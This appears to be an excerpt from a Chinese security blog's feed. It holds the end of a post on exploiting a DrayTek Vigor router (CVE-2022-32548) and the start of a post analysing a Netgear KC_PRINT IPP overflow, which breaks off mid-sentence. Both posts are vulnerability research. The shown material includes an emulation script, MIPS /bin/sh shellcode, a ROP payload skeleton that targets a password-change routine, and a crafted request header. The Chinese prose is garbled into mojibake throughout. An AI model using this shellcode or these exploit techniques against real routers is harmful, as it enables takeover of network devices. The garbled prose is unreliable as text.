class="number">0x80776808</span> </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">MIPS32EL_LIN = unhexlify(<span class="string">&#x27;ffff0628ffffd004ffff05280110e4270ff08424ab0f02240c0101012f62696e2f7368&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    print(<span class="string">&quot;\nVigor 2912 emu&quot;</span>)</span><br><span class="line">    ql = Qiling(code=shellcode, archtype=<span class="string">&quot;mips&quot;</span>, ostype=<span class="string">&quot;linux&quot;</span>, verbose=QL_VERBOSE.DEFAULT)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;v2912_3812-kernel&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    print(hex(len(data)))</span><br><span class="line">    <span class="comment"># mmap memory</span></span><br><span class="line"></span><br><span class="line">    ql.mem.map(<span class="number">0x20000000</span>, <span class="number">0x3000000</span>, info=<span class="string">&quot;[STACK  ]&quot;</span>)</span><br><span class="line">    ql.mem.map(<span class="number">0x23000000</span>, <span class="number">0x3000000</span>, info=<span class="string">&quot;[SHELLCODE  ]&quot;</span>)</span><br><span class="line">    ql.mem.map(<span class="number">0x80020000</span>, len(data) + <span class="number">4092</span>, info=<span class="string">&quot;[RTOS ]&quot;</span>)</span><br><span class="line">    ql.mem.map(<span class="number">0x82000000</span>, <span class="number">0x4000000</span>)</span><br><span class="line">    ql.mem.show_mapinfo()</span><br><span class="line">    ql.mem.write(<span class="number">0x80020000</span>, data) <span class="comment"># rtos data</span></span><br><span class="line">    ql.mem.write(<span class="number">0x21000000</span>, payload.encode(<span class="string">&#x27;latin&#x27;</span>))</span><br><span class="line">    ql.mem.write(<span class="number">0x23000000</span>, shellcode_con)</span><br><span class="line"></span><br><span class="line">    ql.reg.arch_sp = <span class="number">0x20002000</span> <span class="comment">#sp</span></span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x807766EC</span> <span class="comment">#pc</span></span><br><span class="line">    ql.reg.write(<span class="string">&#x27;ra&#x27;</span>, <span class="number">0xdeadbeaf</span>)</span><br><span class="line">    ql.reg.write(<span class="string">&#x27;a0&#x27;</span>, <span class="number">0x21000000</span>)</span><br><span class="line">    ql.hook_address(hook_1, <span class="number">0x807767A0</span>)</span><br><span class="line">    ql.hook_address(hook_2, <span class="number">0x11ff004</span>) <span class="comment"># hjack PC to target functio start address</span></span><br><span class="line">    ql.hook_address(hook_3, <span class="number">0x807768F8</span>)</span><br><span class="line">    <span class="comment"># ql.hook_mem_unmapped(memroy_fix)</span></span><br><span class="line">    ql.debugger = <span class="literal">True</span></span><br><span class="line">    ql.run(begin=<span class="number">0x807766EC</span>)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ€è·¯ï¼š</p><p>[x] ret2shellcode :<br>    åœ¨å°è¯•è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™ï¼Œ å‘ç°æ²¡æ³•æ‰§è¡Œ shellcodeï¼Œ çŒœæµ‹æ˜¯ æŒ‡ä»¤æµæ°´çº¿  cache incoherency  ç‰¹æ€§ï¼Œ å¯èƒ½éœ€è¦åˆ·æ–°æŒ‡ä»¤ï¼Œ ä½†æ˜¯è°ƒç”¨äº†ä¸ª <code>usleep(10000)</code></p><p>è™½ç„¶çœ‹èµ·æ¥ PC å¾€åç§»åŠ¨äº†ï¼Œ ä½†æ˜¯ä»ç„¶æ²¡æ‰§è¡ŒæˆåŠŸï¼Œ åŸå› ä¸æ˜ã€‚</p><p>[âœ“] rop chain</p><p>åœ¨é€†å‘ä¸€äº› cmdlist çš„è¿‡ç¨‹ä¸­ï¼Œ å‘ç°ä¸€ä¸ªä¿®æ”¹å¯†ç æ¥å£</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-be60d5f11a1865aa7487931264edfee5-8e53df.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-be60d5f11a1865aa7487931264edfee5-8e53df.png"></a></p><p>äºæ˜¯æˆ‘è·³è½¬åˆ°è¿™ä¸ªåœ°æ–¹ï¼Œ ä¿®æ”¹å¯†ç  ã€‚è¿™é‡Œæœ‰ä¸€äº›éœ€è¦è·³è¿‡å‘ç‚¹ï¼Œå…·ä½“å¯ä»¥ç•™ç»™æ„Ÿå…´è¶£çš„è¯»è€…äº†ã€‚è¿™é‡Œæä¾›ä¸€ä¸ª PoC ç»™è¯»è€…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pay = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"># 0: b&#x27;admi1\x00\x00\x00&#x27;,</span></span><br><span class="line">        <span class="comment"># 8: shellcode,</span></span><br><span class="line">        <span class="number">272</span>: p32(<span class="number">0xdeadbea0</span>),   <span class="comment"># s0 -&gt; </span></span><br><span class="line">        <span class="number">276</span>: p32(<span class="number">0xdeadbea1</span>),   <span class="comment"># s1 </span></span><br><span class="line">        <span class="number">280</span>: p32(<span class="number">0xdeadbea2</span>),   <span class="comment"># s2 -&gt;</span></span><br><span class="line">        <span class="number">284</span>: p32(<span class="number">0xdeadbea3</span>),   <span class="comment"># s3</span></span><br><span class="line">        <span class="number">288</span>: p32(<span class="number">0xdeadbea4</span>),   <span class="comment"># s4</span></span><br><span class="line">        <span class="number">292</span>: p32(<span class="number">0xdeadbea5</span>),   <span class="comment"># s5</span></span><br><span class="line">        <span class="number">296</span>: p32(<span class="number">0xdeadbea6</span>),   <span class="comment"># s6</span></span><br><span class="line">        <span class="number">308</span>: p32(<span class="number">0xdeadbeaf</span>),   <span class="comment"># ra </span></span><br><span class="line">        <span class="number">360</span>: p32(<span class="number">0x808EC000</span>),   <span class="comment"># </span></span><br><span class="line">        <span class="number">372</span>: p32(<span class="number">0x808EC000</span>),   <span class="comment">#</span></span><br><span class="line">        <span class="number">372</span>+<span class="number">0x40</span> +<span class="number">4</span>: p32(<span class="number">0xdeadbeaf</span>),   <span class="comment"># next ra </span></span><br><span class="line">        <span class="number">432</span>: p32(<span class="number">0xdeadbeaf</span>)   <span class="comment"># next v2 </span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-1383c80801d983eb6a2e3ca3bd499a9b-75928d.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-1383c80801d983eb6a2e3ca3bd499a9b-75928d.png"></a></p><p>cmdlist  ä¸­ä¸€ä¸ªåŠŸèƒ½å¯ä»¥ç”¨æ¥dumpå†…å­˜ï¼Œæ–¹ä¾¿è°ƒè¯• ã€‚ ä½†æ˜¯æ³¨æ„è¿™é‡Œçš„ 0x800000, æˆ‘ä»¬éœ€è¦è®¾ç½®å½“å‰ç”¨æˆ·çš„æƒé™ä¸º 0x800000ã€‚ è¿™é‡Œå°±æ˜¯å¦å¤–ä¸€ä¸ªæŒ‘æˆ˜äº†ï¼Œä¹Ÿç•™ç»™è¯»è€…è‡ªå·±è§£å†³å§ã€‚ 2333</p><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p>[^1]: <a href="https://fw.draytek.com.tw/Vigor2925/">Index of /Vigor2925 (draytek.com.tw)</a><br>[^2]: <a href="https://www.youtube.com/watch?v=CD8HfjdDeuM">HEXACON2022 - Emulate it until you make it! Pwning a DrayTek Router by Philippe Laulheret - YouTube</a><br>[^3]: <a href="https://github.com/sgayou/rbasefind">sgayou/rbasefind: A firmware base address search tool. (github.com)</a><br>[^4]: <a href="https://www.trellix.com/en-us/about/newsroom/stories/research/rce-in-dratyek-routers.html">Unauthenticated Remote Code Execution in a Wide Range of DrayTek Vigor Routers (trellix.com)</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2022-32548" scheme="https://bestwing.me/tags/CVE-2022-32548/"/>
    
  </entry>
  
  <entry>
    <title>Nccgroup Pwn2Own ä¸­æ”»ç ´ Netgear R6700è·¯ç”±å™¨çš„æ¼æ´åˆ†æ</title>
    <link href="https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html"/>
    <id>https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html</id>
    <published>2022-09-08T08:06:00.000Z</published>
    <updated>2022-09-08T06:56:38.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰å‡ å¤© sectoday æ¨äº†ä¸€ä¸ªå…³äº <code>NCC ç ”ç©¶å‘˜å‚åŠ  Pwn2Own Austin 2021 æ¯”èµ›æ”»ç ´è·¯ç”±å™¨ã€NASã€æ‰“å°æœºçš„æŠ€æœ¯ç»†èŠ‚åˆ†äº«</code> çš„æ¨é€ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e66939850217aae2c222c419224b1d80-7753dc.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e66939850217aae2c222c419224b1d80-7753dc.png"></a></p><p>å…¶ä¸­æœ‰ä¸€ä¸ªç¯‡ç« æ˜¯è®² Netgear  R6700 Router çš„ï¼Œ æ°å¥½æˆ‘ä¸Šä¸Šç¯‡åˆ†äº«çš„æ–‡ç«  <a href="https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html">PSV-2020-0437:Buffer-Overflow-on-Some-Netgear-Routers</a> æ‰€ä½¿ç”¨çš„è·¯ç”±å™¨å‹å·ä»¥åŠå›ºä»¶ç‰ˆæœ¬ä¹Ÿåœ¨è¯¥æ¼æ´å½±å“èŒƒå›´ä¹‹å†…ã€‚å› æ­¤æ‰“ç®—åˆ†æè¿™ä¸ªæ¼æ´ï¼Œå¹¶è‡ªå·±å†™ä¸€ä¸‹è¿™ä¸ªæ¼æ´çš„ exploit ã€‚</p><p>æ³¨ï¼š</p><p>åˆ†æä»¥åŠåˆ©ç”¨çš„è·¯ç”±å™¨å‹å·ä¸ºï¼š R6400v2 ï¼Œ å›ºä»¶ç‰ˆæœ¬ä¸ºï¼šV1.0.4.102_10.0.75</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>é€šè¿‡ slide å¯ä»¥å¾—çŸ¥ï¼Œ nccgroup æ‰€å‘ç°çš„æ¼æ´åœ¨ <code>KC_PRINT</code>  è¿™ä¸ªç¨‹åºé‡Œï¼Œæ‰€æ”»å‡»ç«¯å£ä¸º <code>631</code> ç«¯å£ã€‚ æ ¹æ®æˆ‘æµ…è–„çš„çŸ¥è¯†ï¼Œç¬¬ä¸€åæ˜ è¿™æ˜¯ä¸€ä¸ªå’Œ IPP (Internet Printing Protocolï¼Œç¼©å†™IPP, æ˜¯ä¸€ä¸ªç”¨äºé€šè¿‡äº’è”ç½‘æ‰“å°æ–‡ä»¶çš„æ ‡å‡†ç½‘ç»œåè®®) æœ‰å…³çš„ç¨‹åºã€‚ åœ¨åé¢çš„è¿›ä¸€æ­¥åˆ†æçš„è¿‡ç¨‹ä¸­ï¼Œç¡®å®éªŒè¯äº†æˆ‘çš„çŒœæƒ³ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-20a0f61dacf5f6c238e2e5917b83659f-4734c8.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-20a0f61dacf5f6c238e2e5917b83659f-4734c8.png"></a></p><p><code>KC_PRINT</code> ä½¿ç”¨ä¸åŒçš„çº¿ç¨‹æ¥å¤„ç†ä¸åŒçš„åŠŸèƒ½ï¼Œ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-1d0be4ee778833f6e89bf8f2b9769be9-750d1f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-1d0be4ee778833f6e89bf8f2b9769be9-750d1f.png"></a></p><p>è€Œè¯¥æ¼æ´æ˜¯å‘ç”Ÿåœ¨ <code>ipp_server</code> çº¿ç¨‹é‡Œé¢çš„ã€‚ å…¶å¤§è‡´å…¥å£ä»£ç å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( setsockopt(fd, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>) &lt; <span class="number">0</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   perror(<span class="string">&quot;ipp_server: setsockopt SO_REUSEADDR failed&quot;</span>);</span><br><span class="line">   close(fd);</span><br><span class="line">   pthread_attr_destroy(&amp;attr);</span><br><span class="line">   pthread_exit(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> s.sa_family = <span class="number">2</span>;</span><br><span class="line"> *(_DWORD *)&amp;s.sa_data[<span class="number">2</span>] = htonl(<span class="number">0</span>);</span><br><span class="line"> *(_WORD *)s.sa_data = htons(<span class="number">631u</span>); </span><br><span class="line"> <span class="keyword">if</span> ( bind(fd, &amp;s, <span class="number">0x10</span>u) &lt; <span class="number">0</span> ) <span class="comment">// åœ¨ 631 ç«¯å£ç›‘å¬</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"> listen(fd, <span class="number">128</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( flag )</span><br><span class="line"> &#123;</span><br><span class="line">   newfd = accept(fd, &amp;addr, &amp;addr_len);</span><br><span class="line">   <span class="keyword">if</span> ( newfd &gt;= <span class="number">0</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     sub_A0FC(<span class="number">1</span>);</span><br><span class="line">     v1[<span class="number">0</span>] = <span class="number">60</span>;</span><br><span class="line">     v1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">if</span> ( setsockopt(newfd, <span class="number">1</span>, <span class="number">20</span>, v1, <span class="number">8u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">       perror(<span class="string">&quot;ipp_server: setsockopt SO_RCVTIMEO failed&quot;</span>);</span><br><span class="line">     Fd = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">     <span class="keyword">if</span> ( Fd )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="built_in">memset</span>(Fd, <span class="number">0</span>, <span class="number">8u</span>);</span><br><span class="line">       *Fd = newfd;</span><br><span class="line">       pthread_mutex_lock(&amp;stru_18B40);</span><br><span class="line">       v6 = sub_16068();</span><br><span class="line">       <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">       &#123;</span><br><span class="line">...</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> ( pthread_create(&amp;dword_18740[v6], &amp;attr, do_ipp_http_thread, Fd) )</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ç„¶åä¼šè¿›å…¥åˆ°  <code>do_ipp_http_thread</code> å‡½æ•°é‡Œï¼Œ è¯¥å‡½æ•°ä¼šè¿›ä¸€æ­¥è°ƒç”¨ä¸€ä¸ª <code>do_http</code> çš„å‡½æ•°ã€‚ è¯¥å‡½æ•°ç”¨æ¥å¤„ç†å¯¹åº”çš„ IPP åè®®çš„ HTTP è¯·æ±‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">n = recv_n(fd, buf, <span class="number">1024</span>);</span><br><span class="line"><span class="keyword">if</span> ( n &lt;= <span class="number">0</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(buf, <span class="string">&quot;100-continue&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">HTTP_INPUT = <span class="built_in">strstr</span>(buf, <span class="string">&quot;POST /USB&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !HTTP_INPUT )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">HTTP_INPUT += <span class="number">9</span>;</span><br><span class="line">v18 = <span class="built_in">strstr</span>(HTTP_INPUT, <span class="string">&quot;_LQ&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v18 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v13 = *v18;</span><br><span class="line">*v18 = <span class="number">0</span>;</span><br><span class="line">usblp_index = atoi(HTTP_INPUT);</span><br><span class="line">*v18 = v13;</span><br><span class="line"><span class="keyword">if</span> ( usblp_index &gt; <span class="number">10</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( !is_printer_connected(usblp_index) )     <span class="comment">// æ£€æŸ¥æ˜¯å¦æœ‰æ‰“å°æœºè®¾å¤‡æŒ‚è½½</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v22[<span class="number">1</span>] = usblp_index;</span><br><span class="line">HTTP_INPUT = <span class="built_in">strstr</span>(buf, <span class="string">&quot;Content-Length: &quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !HTTP_INPUT )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">HTTP_INPUT += <span class="number">16</span>;</span><br><span class="line">v18 = <span class="built_in">strstr</span>(HTTP_INPUT, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v18 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v13 = *v18;</span><br><span class="line">*v18 = <span class="number">0</span>;</span><br><span class="line">content_len = atoi(HTTP_INPUT);</span><br><span class="line">*v18 = v13;</span><br><span class="line"><span class="built_in">memset</span>(recv_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_buf));</span><br><span class="line">n = recv(fd, recv_buf, <span class="number">8u</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( n != <span class="number">8</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( (recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">2</span>) &amp;&amp; (recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">6</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = do_airippWithContentLength(v22, content_len, recv_buf);</span><br><span class="line">  <span class="keyword">if</span> ( v14 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆ  <code>  n = recv_n(fd, buf, 1024);</code>  æ¥æ”¶ 1024 çš„æ¶ˆæ¯ï¼Œè¿™ä¸€éƒ¨åˆ†æ¶ˆæ¯ä»¥  <code>\r\n</code> ä½œä¸ºç»“æŸæ ‡è¯†ï¼Œ ç„¶åä¼šå–å‡º <code>Content-Length: </code> çš„å€¼ä½œä¸º  <code>content_len</code> ä¼ å…¥ <code>do_airippWithContentLength</code> å‡½æ•°ä¸­ã€‚</p><p>åœ¨è°ƒç”¨ <code>do_airippWithContentLength</code>  å‡½æ•°ä¹‹å‰ï¼Œ è¿˜ä¼šè¯»å–ä¸€ä¸ª 8 å­—èŠ‚é•¿åº¦çš„æ¶ˆæ¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(recv_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_buf));</span><br><span class="line">n = recv(fd, recv_buf, <span class="number">8u</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>è¯¥ 8 å­—èŠ‚é•¿åº¦çš„æ¶ˆæ¯æœ‰ä¸€å®šçš„æ ¼å¼ï¼Œ å½“æ»¡è¶³ <code>(recv_buf[2] || recv_buf[3] != 2) &amp;&amp; (recv_buf[2] || recv_buf[3] != 6)</code> æ¡ä»¶çš„æ—¶å€™æ‰ä¼šè°ƒç”¨ <code>do_airippWithContentLength</code> å‡½æ•°ã€‚</p><p>ä¸”è¿›å…¥åˆ° <code>do_airippWithContentLength </code>å‡½æ•°åï¼Œ ä¼šæ ¹æ®è¿™ä¸ª 8 ä¸ªå­—èŠ‚é•¿åº¦çš„æ¶ˆæ¯ï¼Œ æ¥å†³å®šè¿›ä¸€æ­¥è°ƒç”¨å“ªä¸ªå‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">do_airippWithContentLength</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">size_t</span> content_len, <span class="keyword">const</span> <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *recv_buf; <span class="comment">// [sp+18h] [bp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+1Ch] [bp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> Jobs; <span class="comment">// [sp+24h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = *a1;</span><br><span class="line">  recv_buf = <span class="built_in">malloc</span>(content_len);</span><br><span class="line">  <span class="keyword">if</span> ( !recv_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(recv_buf, buf, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( toRead(v8, (recv_buf + <span class="number">8</span>), content_len - <span class="number">8</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">8</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">9</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">10</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">5</span> )</span><br><span class="line">                Jobs = sub_D0C8(a1, recv_buf);</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                Jobs = Response_Create_Job(a1, recv_buf, content_len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              Jobs = Response_Get_Jobs(a1, recv_buf, content_len);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            Jobs = Response_Get_Job_Attributes(a1, recv_buf, content_len);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Client %d: Cancel-Job\n&quot;</span>, v8);</span><br><span class="line">          Jobs = sub_10EA0(a1, recv_buf);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚æ­¤å¤„ï¼Œ å¦‚æœæˆ‘ä»¬æƒ³è°ƒç”¨ <code>Response_Get_Jobs</code> å‡½æ•°ï¼Œ æˆ‘ä»¬å°±å¾—è¿›ä¸€æ­¥æ»¡è¶³ <code> recv_buf[2] || recv_buf[3] == 10</code>  çš„æ¡ä»¶ï¼Œ æ‰èƒ½è¿›åˆ° <code>Response_Get_Jobs</code> å‡½æ•°é‡Œã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹çš„æ¶ˆæ¯ï¼š</p><p><code>b&#39;\x00\x00\x00\x0a\x00\x00\x99\x99&#39;</code>  è®©å…¶æ»¡è¶³ä¸‹æ ‡ä¸º 3 çš„æ—¶å€™ ä¸º <code>10</code>  